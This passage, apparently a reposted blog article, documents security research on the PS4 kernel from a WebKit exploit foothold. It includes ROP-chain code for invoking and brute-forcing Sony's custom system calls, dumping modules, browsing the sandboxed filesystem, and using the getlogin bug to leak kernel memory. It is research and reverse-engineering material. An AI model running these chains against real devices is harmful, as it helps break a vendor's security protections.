    mov     r10, rcx
    syscall
    ret
</code></pre><p>Using this, they can perform system calls from C using the function calling convention:</p>
<pre><code>int syscall();

int getpid(void) &#123;
    return syscall(20);
&#125;
</code></pre><p>When writing ROP chains, we can use either convention:</p>
<pre><code>// Both will get the current process ID:
chain.syscall(&quot;getpid&quot;, 20);
chain.syscall(&quot;getpid&quot;, 0, 20);
</code></pre><p>It’s good to be aware of this, because we can use whichever one is more convenient for the gadgets that are available.</p>
<h1 id="getpid"><a href="#getpid" class="headerlink" title="getpid"></a>getpid</h1><p>Just by using system call 20, <a href="http://www.freebsd.org/cgi/man.cgi?query=getpid&amp;sektion=2">getpid(void)</a>, we can learn a lot about the kernel.</p>
<p>The very fact that this system call works at all tells us that Sony didn’t bother mixing up the system call numbers as a means of <a href="https://en.wikipedia.org/wiki/Security_through_obscurity">security through obscurity</a> (under the BSD license they could have done this without releasing the new system call numbers).</p>
<p>So, we automatically have a <a href="http://fxr.watson.org/fxr/source/kern/syscalls.master?v=FREEBSD9">list of system calls in the PS4 kernel</a> to try.</p>
<p>Secondly, by calling <code>getpid()</code>, restarting the browser, and calling it again, we get a return value 2 higher than the previous value.</p>
<p>This tells us that the Internet Browser app actually consists of 2 separate processes: the WebKit core (which we take over), that handles parsing HTML and CSS, decoding images, and executing JavaScript for example, and another one to handle everything else: displaying graphics, receiving controller input, managing history and bookmarks, etc.</p>
<p>Also, although FreeBSD has supported <a href="http://security.stackexchange.com/questions/88692/do-randomized-pid-bring-more-security">PID randomisation</a> since 4.0, sequential PID allocation is the default behaviour.</p>
<p>The fact that PID allocation is set to the default behaviour indicates that Sony likely didn’t bother adding any additional security enhancements such as those encouraged by projects like <a href="https://hardenedbsd.org/">HardenedBSD</a>, other than userland ASLR.</p>
<h2 id="How-many-custom-system-calls-are-there"><a href="#How-many-custom-system-calls-are-there" class="headerlink" title="How many custom system calls are there?"></a>How many custom system calls are there?</h2><p>The <a href="http://fxr.watson.org/fxr/source/kern/syscalls.master?v=FREEBSD9#L952">last standard FreeBSD 9 system call</a> is <code>wait6</code>, number <code>532</code>; anything higher than this must be a custom Sony system call.</p>
<p>Invoking most of Sony’s custom system calls without the correct arguments will return error <code>0x16</code>, <code>&quot;Invalid argument&quot;</code>; however, any compatibility or unimplemented system calls will report the “There is not enough free system memory” error.</p>
<p>Through trial and error, I have found that system call number <code>617</code> is the last Sony system call, anything higher is unimplemented.</p>
<p>From this, we can conclude that there are 85 custom Sony system calls in the PS4’s kernel (617 - 532).</p>
<h2 id="libkernel-sprx"><a href="#libkernel-sprx" class="headerlink" title="libkernel.sprx"></a>libkernel.sprx</h2><p>To identify how custom system calls are used by libkernel, you must first remember that it is just a modification of the standard FreeBSD 9.0 libraries.</p>
<p>Here’s an extract of <code>_libpthread_init</code> from <a href="https://github.com/freebsd/freebsd/blob/release/9.0.0/lib/libthr/thread/thr_init.c#L297">thr_init.c</a>:</p>
<pre><code>/*
 * Check for the special case of this process running as
 * or in place of init as pid = 1:
 */
if ((_thr_pid = getpid()) == 1) &#123;
    /*
     * Setup a new session for this process which is
     * assumed to be running as root.
     */
    if (setsid() == -1)
        PANIC(&quot;Can&#39;t set session ID&quot;);
    if (revoke(_PATH_CONSOLE) != 0)
        PANIC(&quot;Can&#39;t revoke console&quot;);
    if ((fd = __sys_open(_PATH_CONSOLE, O_RDWR)) &amp;lt; 0)
        PANIC(&quot;Can&#39;t open console&quot;);
    if (setlogin(&quot;root&quot;) == -1)
        PANIC(&quot;Can&#39;t set login to root&quot;);
    if (_ioctl(fd, TIOCSCTTY, (char *) NULL) == -1)
        PANIC(&quot;Can&#39;t set controlling terminal&quot;);
&#125;
</code></pre><p>The same function can be found at offset <code>0x215F0</code> from <code>libkernel.sprx</code>. This is how the above extract looks from within a libkernel dump:</p>
<pre><code>call    getpid
mov     cs:dword_5B638, eax
cmp     eax, 1
jnz     short loc_2169F

call    setsid
cmp     eax, 0FFFFFFFFh
jz      loc_21A0C

lea     rdi, aDevConsole ; &quot;/dev/console&quot;
call    revoke
test    eax, eax
jnz     loc_21A24

lea     rdi, aDevConsole ; &quot;/dev/console&quot;
mov     esi, 2
xor     al, al
call    open

mov     r14d, eax
test    r14d, r14d
js      loc_21A3C
lea     rdi, aRoot       ; &quot;root&quot;
call    setlogin
cmp     eax, 0FFFFFFFFh
jz      loc_21A54

mov     edi, r14d
mov     esi, 20007461h
xor     edx, edx
xor     al, al
call    ioctl
cmp     eax, 0FFFFFFFFh
jz      loc_21A6C
</code></pre><h2 id="Reversing-module-dumps-to-analyse-system-calls"><a href="#Reversing-module-dumps-to-analyse-system-calls" class="headerlink" title="Reversing module dumps to analyse system calls"></a>Reversing module dumps to analyse system calls</h2><p>libkernel isn’t completely open source though; there’s also a lot of custom code which can help disclose some of Sony’s system calls.</p>
<p>Although this process will vary depending on the system call you are looking up; for some, it is fairly easy to get a basic understanding of the arguments that are passed to it.</p>
<p>The system call wrapper will be declared somewhere in <code>libkernel.sprx</code>, and will almost always follow this template:</p>
<pre><code>000000000000DB70 syscall_601     proc near
000000000000DB70                 mov     rax, 259h
000000000000DB77                 mov     r10, rcx
000000000000DB7A                 syscall
000000000000DB7C                 jb      short error
000000000000DB7E                 retn
000000000000DB7F
000000000000DB7F error:
000000000000DB7F                 lea     rcx, sub_DF60
000000000000DB86                 jmp     rcx
000000000000DB86 syscall_601     endp
</code></pre><p>Note that the <code>mov r10, rcx</code> instruction doesn’t necessarily mean that the system call takes at least 4 arguments; all system call wrappers have it, even those that take no arguments, such as <code>getpid</code>.</p>
<p>Once you’ve found the wrapper, you can look up xrefs to it:</p>
<pre><code>0000000000011D50                 mov     edi, 10h
0000000000011D55                 xor     esi, esi
0000000000011D57                 mov     edx, 1
0000000000011D5C                 call    syscall_601
0000000000011D61                 test    eax, eax
0000000000011D63                 jz      short loc_11D6A
</code></pre><p>It’s good to look up several of these, just to make sure that the registers weren’t modified for something unrelated:</p>
<pre><code>0000000000011A28                 mov     edi, 9
0000000000011A2D                 xor     esi, esi
0000000000011A2F                 xor     edx, edx
0000000000011A31                 call    syscall_601
0000000000011A36                 test    eax, eax
0000000000011A38                 jz      short loc_11A3F
</code></pre><p>Consistently, the first three registers of the system call convention (<code>rdi</code>, <code>rsi</code>, and <code>rdx</code>) are modified before invoking the call, so we can conclude with reasonable confidence that it takes 3 arguments.</p>
<p>For clarity, this is how we would replicate the calls in JuSt-ROP:</p>
<pre><code>chain.syscall(&quot;unknown&quot;, 601, 0x10, 0, 1);
chain.syscall(&quot;unknown&quot;, 601, 9, 0, 0);
</code></pre><p>As with most system calls, it will return 0 on success, as seen by the <code>jz</code> conditional after <code>test</code>ing the return value.</p>
<p>Looking up anything beyond than the amount of arguments will require a much more in-depth analysis of the code before and after the call to understand the context, but this should help you get started.</p>
<h2 id="Brute-forcing-system-calls"><a href="#Brute-forcing-system-calls" class="headerlink" title="Brute forcing system calls"></a>Brute forcing system calls</h2><p>Although reverse engineering module dumps is the most reliable way to identify system calls, some aren’t referenced at all in the dumps we have so we will need to analyse them blindly.</p>
<p>If we guess that a certain system call might take a particular set of arguments, we can brute force all system calls which return a certain value (<code>0</code> for success) with the arguments that we chose, and ignore all which returned an error.</p>
<p>We can also pass 0s for all arguments, and brute force all system calls which return useful errors such as <code>0xe</code>, <code>&quot;Bad address&quot;</code>, which would indicate that they take at least one pointer.</p>
<p>Firstly, we will need to execute the ROP chain as soon as the page loads. We can do this by attaching our function to the <code>body</code> element’s <code>onload</code>:</p>
<pre><code>&lt;body onload=&quot;exploit()&quot;&gt;
</code></pre><p>Next we will need to perform a specific system call depending on an HTTP GET value. Although this can be done with JavaScript, I will demonstrate how to do this using PHP for simplicity:</p>
<pre><code>var Sony = 533;
chain.syscall(&quot;Sony system call&quot;, Sony + &amp;lt;?php print($_GET[&quot;b&quot;]); ?&amp;gt;, 0, 0, 0, 0, 0, 0);
chain.write_rax_ToVariable(0);
</code></pre><p>Once the system call has executed, we can check the return value, and if it isn’t interesting, redirect the page to the next system call:</p>
<pre><code>if(chain.getVariable(0) == 0x16) window.location.assign(&quot;index.php?b=&quot; + (&amp;lt;?php print($_GET[&quot;b&quot;]); ?&amp;gt; + 1).toString());
</code></pre><p>Running the page with <code>?b=0</code> appended to the end will start the brute force from the first Sony system call.</p>
<p>Although this method requires a lot of experimentation, by passing different values to some of the system calls found by brute forcing and analysing the new return values, there are a few system calls which you should be able to partially identify.</p>
<h2 id="System-call-538"><a href="#System-call-538" class="headerlink" title="System call 538"></a>System call 538</h2><p>As an example, I’ll take a look at system call 538, without relying on any module dumps.</p>
<p>These are the return values depending on what is passed as the first argument:</p>
<ul>
<li>0 - <code>0x16</code>, <code>&quot;Invalid argument&quot;</code></li>
<li>1 - <code>0xe</code>, <code>&quot;Bad address&quot;</code></li>
<li>Pointer to 0s - <code>0x64</code> initially, but each time the page is refreshed this value increases by 1</li>
</ul>
<p>Other potential arguments to try would be PID, thread ID, and file descriptor.</p>
<p>Although most system calls will return <code>0</code> on success, due to the nature of the return value increasing after each time it is called, it seems like it is allocating a resource number, such as a file descriptor. </p>
<p>The next thing to do would be to look at the data before and after performing the system call, to see if it has been written to.</p>
<p>Since there is no change in the data, we can assume that it is an input for now.</p>
<p>I then tried passing a long string as the first argument. You should always try this with every input you find because there is the possibility of discovering a buffer overflow.</p>
<pre><code>writeString(chain.data, &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;);
chain.syscall(&quot;unknown&quot;, 538, chain.data, 0, 0, 0, 0, 0);
</code></pre><p>The return value for this is <code>0x3f</code>, <code>ENAMETOOLONG</code>. Unfortunately it seems that this system call correctly limits the name (32 bytes including <code>NULL</code> truncator), but it does tell us that it <em>is</em> expecting a string, rather than a struct.</p>
<p>We now have a few possibilities for what this system call is doing, the most obvious being something related to the filesystem (such as a custom <code>mkdir</code> or <code>open</code>), but this doesn’t seem particularly likely seeing as a resource was allocated even before we wrote any data to the pointer.</p>
<p>To test whether the first parameter is a path, we can break it up with multiple <code>/</code> characters to see if this allows for a longer string:</p>
<pre><code>writeString(chain.data, &quot;aaaaaaaaaa/aaaaaaaaaa/aaaaaaaaaa&quot;);
chain.syscall(&quot;unknown&quot;, 538, chain.data, 0, 0, 0, 0, 0);
</code></pre><p>Since this also returns <code>0x3f</code>, we can assume that the first argument isn’t a path; it is a name for <em>something</em> that gets allocated a sequential identifier.</p>
<p>After analysing some more system calls, I found that the following all shared this exact same behaviour:</p>
<ul>
<li>533</li>
<li>538</li>
<li>557</li>
<li>574</li>
<li>580</li>
</ul>
<p>From the information that we have so far, it is almost impossible to pinpoint exactly what these system calls do, but as you run more tests, further information will slowly be revealed.</p>
<p>To save you some time, system call 538 is allocating an event flag (and it doesn’t just take a name).</p>
<p>Using general knowledge of how a kernel works, you can guess, and then verify, what the system calls are allocating (semaphores, mutexes, etc).</p>
<h2 id="Dumping-additional-modules"><a href="#Dumping-additional-modules" class="headerlink" title="Dumping additional modules"></a>Dumping additional modules</h2><p>We can dump additional modules by following these stages:</p>
<ul>
<li>Load the module</li>
<li>Get the module’s base address</li>
<li>Dump the module</li>
</ul>
<p>I’ve extracted and posted a list of all module names on <a href="http://www.psdevwiki.com/ps4/Libraries#Libraries_on_firmware_1.76">psdevwiki</a>.</p>
<p>To load a module we will need to use the <code>sceSysmoduleLoadModule</code> function from <code>libSceSysmodule.sprx + 0x1850</code>. The first parameter is the module ID to load, and the other 3 should just be passed 0.</p>
<p>The following JuSt-ROP method can be used to perform a function call:</p>
<pre><code>this.call = function(name, module, address, arg1, arg2, arg3, arg4, arg5, arg6) &#123;
    console.log(&quot;call &quot; + name);

    if(typeof(arg1) !== &quot;undefined&quot;) this.add(&quot;pop rdi&quot;, arg1);
    if(typeof(arg2) !== &quot;undefined&quot;) this.add(&quot;pop rsi&quot;, arg2);
    if(typeof(arg3) !== &quot;undefined&quot;) this.add(&quot;pop rdx&quot;, arg3);
    if(typeof(arg4) !== &quot;undefined&quot;) this.add(&quot;pop rcx&quot;, arg4);
    if(typeof(arg5) !== &quot;undefined&quot;) this.add(&quot;pop r8&quot;, arg5);
    if(typeof(arg6) !== &quot;undefined&quot;) this.add(&quot;pop r9&quot;, arg6);
    this.add(module_bases[module] + address);
&#125;
</code></pre><p>So, to load <code>libSceAvSetting.sprx</code> (<code>0xb</code>):</p>
<pre><code>chain.call(&quot;sceSysmoduleLoadModule&quot;, libSysmodule, 0x1850, 0xb, 0, 0, 0);
</code></pre><p>Unfortunately, a fault will be triggered when trying to load certain modules; this is because the <code>sceSysmoduleLoadModule</code> function doesn’t load dependencies, so you will need to manually load them first.</p>
<p>Like most system calls, this should return <code>0</code> on success. To see the loaded module ID that was allocated, we can use one of Sony’s custom system calls, number <code>592</code>, to get a list of currently loaded modules:</p>
<pre><code>var countAddress = chain.data;
var modulesAddress = chain.data + 8;

// System call 592, getLoadedModules(int *destinationModuleHandles, int max, int *count);
chain.syscall(&quot;getLoadedModules&quot;, 592, modulesAddress, 256, countAddress);

chain.execute(function() &#123;
    var count = getU64from(countAddress);
    for(var index = 0; index &amp;lt; count; index++) &#123;
        logAdd(&quot;Module handle: 0x&quot; + getU32from(modulesAddress + index * 4).toString(16));
    &#125;
&#125;);
</code></pre><p>Running this without loading any additional modules will produce the following list:</p>
<pre><code>0x0, 0x1, 0x2, 0xc, 0xe, 0xf, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1a, 0x1b, 0x1e, 0x37, 0x59
</code></pre><p>But if we run it after loading module <code>0xb</code>, we will see an additional entry, <code>0x65</code>. Remember that module ID is <em>not</em> the same as loaded module handle.</p>
<p>We can now use another of Sony’s custom system calls, number <code>593</code>, which takes a module handle and a buffer, and fills the buffer with information about the loaded module, including its base address. Since the next available handle is always <code>0x65</code>, we can hardcode this value into our chain, rather than having to store the result from the module list.</p>
<p>The buffer must start with the size of the struct that should be returned, otherwise error <code>0x16</code> will be returned, <code>&quot;Invalid argument&quot;</code>:</p>
<pre><code>setU64to(moduleInfoAddress, 0x160);
chain.syscall(&quot;getModuleInfo&quot;, 593, 0x65, moduleInfoAddress);

chain.execute(function() &#123;
    logAdd(hexDump(moduleInfoAddress, 0x160));
&#125;);
</code></pre><p>It will return <code>0</code> upon success, and fill the buffer with a struct which can be read like so:</p>
<pre><code>var name = readString(moduleInfoAddress + 0x8);
var codeBase = getU64from(moduleInfoAddress + 0x108);
var codeSize = getU32from(moduleInfoAddress + 0x110);
var dataBase = getU64from(moduleInfoAddress + 0x118);
var dataSize = getU32from(moduleInfoAddress + 0x120);
</code></pre><p>We now have everything we need to dump the module!</p>
<pre><code>dump(codeBase, codeSize + dataSize);
</code></pre><p>There is another Sony system call, number <code>608</code>, which works in a similar way to <code>593</code>, but provides slightly different information about the loaded module:</p>
<pre><code>setU64to(moduleInfoAddress, 0x1a8);
chain.syscall(&quot;getDifferentModuleInfo&quot;, 608, 0x65, 0, moduleInfoAddress);
logAdd(hexDump(moduleInfoAddress, 0x1a8));
</code></pre><p>It’s not clear what this information is.</p>
<h2 id="Browsing-the-filesystem"><a href="#Browsing-the-filesystem" class="headerlink" title="Browsing the filesystem"></a>Browsing the filesystem</h2><p>The PS4 uses the standard FreeBSD 9.0 system calls for reading files and directories.</p>
<p>However, whilst using <code>read</code> for some directories such as <code>/dev/</code> will work, others, such as <code>/</code> will fail.</p>
<p>I’m not sure why this is, but if we use <code>getdents</code> instead of <code>read</code> for directories, it will work much more reliably:</p>
<pre><code>writeString(chain.data, &quot;/dev/&quot;);
chain.syscall(&quot;open&quot;, 5, chain.data, 0, 0);
chain.write_rax_ToVariable(0);

chain.read_rdi_FromVariable(0);
chain.syscall(&quot;getdents&quot;, 272, undefined, chain.data + 0x10, 1028);
</code></pre><p>This is the resultant memory:</p>
<pre><code>0000010: 0700 0000 1000 0205 6469 7073 7700 0000  ........dipsw...
0000020: 0800 0000 1000 0204 6e75 6c6c 0000 0000  ........null....
0000030: 0900 0000 1000 0204 7a65 726f 0000 0000  ........zero....
0000040: 0301 0000 0c00 0402 6664 0000 0b00 0000  ........fd......
0000050: 1000 0a05 7374 6469 6e00 0000 0d00 0000  ....stdin.......
0000060: 1000 0a06 7374 646f 7574 0000 0f00 0000  ....stdout......
0000070: 1000 0a06 7374 6465 7272 0000 1000 0000  ....stderr......
0000080: 1000 0205 646d 656d 3000 0000 1100 0000  ....dmem0.......
0000090: 1000 0205 646d 656d 3100 0000 1300 0000  ....dmem1.......
00000a0: 1000 0206 7261 6e64 6f6d 0000 1400 0000  ....random......
00000b0: 1000 0a07 7572 616e 646f 6d00 1600 0000  ....urandom.....
00000c0: 1400 020b 6465 6369 5f73 7464 6f75 7400  ....deci_stdout.
00000d0: 1700 0000 1400 020b 6465 6369 5f73 7464  ........deci_std
00000e0: 6572 7200 1800 0000 1400 0209 6465 6369  err.........deci
00000f0: 5f74 7479 3200 0000 1900 0000 1400 0209  _tty2...........
0000100: 6465 6369 5f74 7479 3300 0000 1a00 0000  deci_tty3.......
0000110: 1400 0209 6465 6369 5f74 7479 3400 0000  ....deci_tty4...
0000120: 1b00 0000 1400 0209 6465 6369 5f74 7479  ........deci_tty
0000130: 3500 0000 1c00 0000 1400 0209 6465 6369  5...........deci
0000140: 5f74 7479 3600 0000 1d00 0000 1400 0209  _tty6...........
0000150: 6465 6369 5f74 7479 3700 0000 1e00 0000  deci_tty7.......
0000160: 1400 020a 6465 6369 5f74 7479 6130 0000  ....deci_ttya0..
0000170: 1f00 0000 1400 020a 6465 6369 5f74 7479  ........deci_tty
0000180: 6230 0000 2000 0000 1400 020a 6465 6369  b0.. .......deci
0000190: 5f74 7479 6330 0000 2200 0000 1400 020a  _ttyc0..&quot;.......
00001a0: 6465 6369 5f73 7464 696e 0000 2300 0000  deci_stdin..#...
00001b0: 0c00 0203 6270 6600 2400 0000 1000 0a04  ....bpf.$.......
00001c0: 6270 6630 0000 0000 2900 0000 0c00 0203  bpf0....).......
00001d0: 6869 6400 2c00 0000 1400 0208 7363 655f  hid.,.......sce_
00001e0: 7a6c 6962 0000 0000 2e00 0000 1000 0204  zlib............
00001f0: 6374 7479 0000 0000 3400 0000 0c00 0202  ctty....4.......
0000200: 6763 0000 3900 0000 0c00 0203 6463 6500  gc..9.......dce.
0000210: 3a00 0000 1000 0205 6462 6767 6300 0000  :.......dbggc...
0000220: 3e00 0000 0c00 0203 616a 6d00 4100 0000  &gt;.......ajm.A...
0000230: 0c00 0203 7576 6400 4200 0000 0c00 0203  ....uvd.B.......
0000240: 7663 6500 4500 0000 1800 020d 6e6f 7469  vce.E.......noti
0000250: 6669 6361 7469 6f6e 3000 0000 4600 0000  fication0...F...
0000260: 1800 020d 6e6f 7469 6669 6361 7469 6f6e  ....notification
0000270: 3100 0000 5000 0000 1000 0206 7573 6263  1...P.......usbc
0000280: 746c 0000 5600 0000 1000 0206 6361 6d65  tl..V.......came
0000290: 7261 0000 8500 0000 0c00 0203 726e 6700  ra..........rng.
00002a0: 0701 0000 0c00 0403 7573 6200 c900 0000  ........usb.....
00002b0: 1000 0a07 7567 656e 302e 3400 0000 0000  ....ugen0.4.....
00002c0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
</code></pre><p>You can read some of these devices, for example: reading <code>/dev/urandom</code> will fill the memory with random data.</p>
<p>It is also possible to parse this memory to create a clean list of entries; look at <code>browser.html</code> in the repository for a complete file browser:</p>
<p><img src="/img/hacking-ps4-1/browser.png" alt=""></p>
<p>Unfortunately, due to sandboxing we don’t have complete access to the file system. Trying to read files and directories that <a href="http://www.psdevwiki.com/ps4/Talk:Files_on_the_PS4">do exist</a> but are restricted will give you error 2, <code>ENOENT</code>, <code>&quot;No such file or directory&quot;</code>.</p>
<p>We do have access to a lot of interesting stuff though including encrypted save data, trophies, and account information. I will go over more of the filesystem in my next article.</p>
<h2 id="Sandboxing"><a href="#Sandboxing" class="headerlink" title="Sandboxing"></a>Sandboxing</h2><p>As well as file related system calls failing for certain paths, there are other reasons for a system call to fail.</p>
<p>Most commonly, a disallowed system call will just return error <code>1</code>, <code>EPERM</code>, <code>&quot;Operation not permitted&quot;</code>; such as trying to use <code>ptrace</code>, but other system calls may fail for different reasons:</p>
<p>Compatibilty system calls are disabled. If you are trying to call <code>mmap</code> for example, you must use <a href="http://fxr.watson.org/fxr/source/kern/syscalls.master?v=FREEBSD9#L851">system call number 477</a>, not <a href="http://fxr.watson.org/fxr/source/kern/syscalls.master?v=FREEBSD9#L172">71</a> or <a href="http://fxr.watson.org/fxr/source/kern/syscalls.master?v=FREEBSD9#L379">197</a>; otherwise a segfault will be triggered.</p>
<p>Other system calls such as <code>exit</code> will also trigger a fault:</p>
<pre><code>chain.syscall(&quot;exit&quot;, 1, 0);
</code></pre><p>Trying to create an SCTP socket will return error <code>0x2b</code>, <code>EPROTONOSUPPORT</code>, indicating that SCTP sockets have been disabled in the PS4 kernel:</p>
<pre><code>//int socket(int domain, int type, int protocol);
//socket(AF_INET, SOCK_STREAM, IPPROTO_SCTP);
chain.syscall(&quot;socket&quot;, 97, 2, 1, 132);
</code></pre><p>And although calling <code>mmap</code> with <code>PROT_READ | PROT_WRITE | PROT_EXEC</code> will return a valid pointer, the <code>PROT_EXEC</code> flag is ignored. Reading its protection will return 3 (RW), and any attempt to execute the memory will trigger a segfault:</p>
<pre><code>chain.syscall(&quot;mmap&quot;, 477, 0, 4096, 1 | 2 | 4, 4096, -1, 0);
chain.write_rax_ToVariable(0);
chain.read_rdi_FromVariable(0);
chain.add(&quot;pop rax&quot;, 0xfeeb);
chain.add(&quot;mov [rdi], rax&quot;);
chain.add(&quot;mov rax, rdi&quot;);
chain.add(&quot;jmp rax&quot;);
</code></pre><p>The list of <a href="http://www.scei.co.jp/ps4-license/">open source software used in the PS4</a> doesn’t list any kind of sandboxing software like <a href="https://www.freebsd.org/cgi/man.cgi?query=capsicum">Capsicum</a>, so the PS4 must use either pure <a href="https://www.freebsd.org/doc/handbook/jails.html">FreeBSD jails</a>, or some kind of custom, proprietary, sandboxing system (unlikely).</p>
<h2 id="Jails"><a href="#Jails" class="headerlink" title="Jails"></a>Jails</h2><p>We can prove the existence of FreeBSD jails being actively used in the PS4’s kernel through the <code>auditon</code> system call being impossible to execute within a jailed environment:</p>
<pre><code>chain.syscall(&quot;auditon&quot;, 446, 0, 0, 0);
</code></pre><p>The first thing the <code>auditon</code> system call does is check <code>jailed</code> <a href="https://github.com/freebsd/freebsd/blob/release/9.0.0/sys/security/audit/audit_syscalls.c#L164">here</a>, and if so, return <code>ENOSYS</code>:</p>
<pre><code>if (jailed(td-&gt;td_ucred))
    return (ENOSYS);
</code></pre><p>Otherwise the system call would most likely return <code>EPERM</code> from the <code>mac_system_check_auditon</code> <a href="https://github.com/freebsd/freebsd/blob/release/9.0.0/sys/security/audit/audit_syscalls.c#L169">here</a>:</p>
<pre><code>error = mac_system_check_auditon(td-&gt;td_ucred, uap-&gt;cmd);
if (error)
    return (error);
</code></pre><p>Or from the <code>priv_check</code> <a href="https://github.com/freebsd/freebsd/blob/release/9.0.0/sys/security/audit/audit_syscalls.c#L174">here</a>:</p>
<pre><code>error = priv_check(td, PRIV_AUDIT_CONTROL);
if (error)
    return (error);
</code></pre><p>The absolute furthest that the system call could reach would be immediately after the <code>priv_check</code>, <a href="https://github.com/freebsd/freebsd/blob/release/9.0.0/sys/security/audit/audit_syscalls.c#L178">here</a>, before returning <code>EINVAL</code> due to the length argument being 0:</p>
<pre><code>if ((uap-&gt;length &lt;= 0) || (uap-&gt;length &gt; sizeof(union auditon_udata)))
    return (EINVAL);
</code></pre><p>Since <code>mac_system_check_auditon</code> and <code>priv_check</code> will never return <code>ENOSYS</code>, having the <code>jailed</code> check pass is the only way <code>ENOSYS</code> could be returned.</p>
<p>When executing the chain, <code>ENOSYS</code> <em>is</em> returned (<code>0x48</code>).</p>
<p>This tells us that whatever sandbox system the PS4 uses is at least based on jails because the <code>jailed</code> check passes.</p>
<h2 id="FreeBSD-9-0-kernel-exploits"><a href="#FreeBSD-9-0-kernel-exploits" class="headerlink" title="FreeBSD 9.0 kernel exploits"></a>FreeBSD 9.0 kernel exploits</h2><p>Before trying to look for new vulnerabilities in the <a href="https://github.com/freebsd/freebsd/tree/release/9.0.0/sys/kern">FreeBSD 9.0 kernel source code</a>, we should first check whether any of the <a href="https://www.exploit-db.com/platform/?p=freebsd">kernel vulnerabilities already found</a> could be used on the PS4.</p>
<p>We can immediately dismiss some of these for obvious reasons:</p>
<ul>
<li><a href="https://www.exploit-db.com/exploits/26368/">FreeBSD 9.0-9.1 mmap/ptrace - Privilege Escalation Exploit</a> - this won’t work since, as previously stated, we don’t have access to the <code>ptrace</code> system call.</li>
<li><a href="https://www.exploit-db.com/exploits/28718/">FreeBSD 9.0 - Intel SYSRET Kernel Privilege Escalation Exploit</a> - won’t work because the PS4 uses an AMD processor.</li>
<li><a href="https://www.exploit-db.com/exploits/35938/">FreeBSD Kernel - Multiple Vulnerabilities</a> - maybe the first vulnerability will lead to something, but the other 2 rely on SCTP sockets, which the PS4 kernel has disabled (as previously stated).</li>
</ul>
<p>However, there are <a href="http://www.cvedetails.com/vulnerability-list/vendor_id-6/product_id-7/version_id-118765/Freebsd-Freebsd-9.0.html">some smaller vulnerabilites</a>, which could lead to something:</p>
<h2 id="getlogin"><a href="#getlogin" class="headerlink" title="getlogin"></a>getlogin</h2><p>One vulnerability which looks easy to try is using the <a href="http://www.cvedetails.com/cve/CVE-2014-8476/">getlogin system call to leak a small amount of kernel memory</a>.</p>
<p>The <a href="https://www.freebsd.org/cgi/man.cgi?query=getlogin&amp;sektion=2"><code>getlogin</code></a> system call is intended to copy the login name of the current session to userland memory, however, due to a bug, the whole buffer is always copied, and not just the size of the name string. This means that we can read some uninitialised data from the kernel, which might be of some use.</p>
<p>Note that the system call (49) is actually <code>int getlogin_r(char *name, int len);</code> and not <code>char *getlogin(void);</code>.</p>
<p>So, let’s try copying some kernel memory into an unused part of userland memory:</p>
<pre><code>chain.syscall(&quot;getlogin&quot;, 49, chain.data, 17);
</code></pre><p>Unfortunately 17 bytes is the most data we can get, since:</p>
<blockquote>
<p>Login names are limited to <code>MAXLOGNAME</code> (from <code>&amp;lt;sys/param.h&amp;gt;</code>) characters, currently 17 including null.</p>
<p>— <cite><a href="https://www.freebsd.org/cgi/man.cgi?query=getlogin&amp;sektion=2">FreeBSD Man Pages</a></cite></p>
</blockquote>
<p>After executing the chain, the return value was 0, which means that the system call worked! An excellent start. Now let’s take a look at the memory which we pointed to:</p>
<p>Before executing the chain:</p>
<pre><code>00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00
</code></pre><p>After executing the chain:</p>
<pre><code>72 6f 6f 74 00 fe ff ff 08 62 61 82 ff ff ff ff
00
</code></pre><p>After decoding the first 4 bytes as ASCII:</p>
<pre><code>root
</code></pre><p>So the browser is executed as root! That was unexpected.</p>
<p>But more interestingly, the memory leaked looks like a pointer to something in the kernel, which is always the same each time the chain is run; this is evidence to support <a href="https://twitter.com/yifanlu/status/551498289284009984">Yifanlu’s claims that the PS4 has no Kernel ASLR</a>!</p>
<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>From the information currently available, the PS4’s kernel seems to be very similar to the stock FreeBSD 9.0 kernel.</p>
<p>Importantly, the differences that <em>are</em> present appear to be from standard <a href="https://www.freebsd.org/doc/handbook/kernelconfig-custom-kernel.html">kernel configuration</a> changes (such as disabling SCTP sockets), rather than from modified code. Sony have also added several of their own custom system calls to the kernel, but apart from this, the rest of the kernel seems fairly untouched.</p>
<p>In this respect, I’m inclined to believe that the PS4 shares most of the same juicy vulnerabilities as FreeBSD 9.0’s kernel!</p>
<p>Unfortunately, most kernel exploits cannot be triggered from the WebKit entry point that we currently have due to sandboxing constraints (likely to be just stock FreeBSD jails).</p>
<p>And with FreeBSD 10 being out, it’s unlikely that anyone is stashing away any private exploits for FreeBSD 9, so unless a new one is suddenly released, we’re stuck with what is currently available.</p>
<p>The best approach from here seems to be reverse engineering all of the modules which can be dumped, in order to document as many of Sony’s custom system calls as possible; I have a hunch that we will have more luck targeting these, than the standard FreeBSD system calls.</p>
<p>Recently <a href="http://hackinformer.com/2015/06/24/breaking-news-discovered-two-communication-ports-uart-playstation-4/">Jaicrab has discovered two UART ports on the PS4</a> which shows us that there are hardware hackers interested in the PS4. Although the role of hardware hackers has traditionally been to dump the RAM of a system, <a href="http://farm4.static.flickr.com/3441/3869187499_da1665050d.jpg">like with the DSi</a>, which we can already do thanks to the WebKit exploit, there’s also the possibility of a hardware triggered kernel vulnerability being found, like <a href="http://rdist.root.org/2010/01/27/how-the-ps3-hypervisor-was-hacked/">geohot’s original PS3 hypervisor hack</a>. It remains most likely that a kernel exploit will be found on the PS4 through system call vulnerabilities though.</p>
<p><a href="http://cturt.github.io/ps4.html">原文地址</a></p>
]]></content>
      <categories>
        <category>硬件分析</category>
      </categories>
      <tags>
        <tag>外文翻译</tag>
        <tag>漏洞挖掘</tag>
        <tag>PS4</tag>
        <tag>硬件分析</tag>
      </tags>
  </entry>
  <entry>
    <title>秘密共享及门限签名</title>
    <url>/2019/05/14/%E7%A7%98%E5%AF%86%E5%85%B1%E4%BA%AB%E5%8F%8A%E9%97%A8%E9%99%90%E7%AD%BE%E5%90%8D/</url>
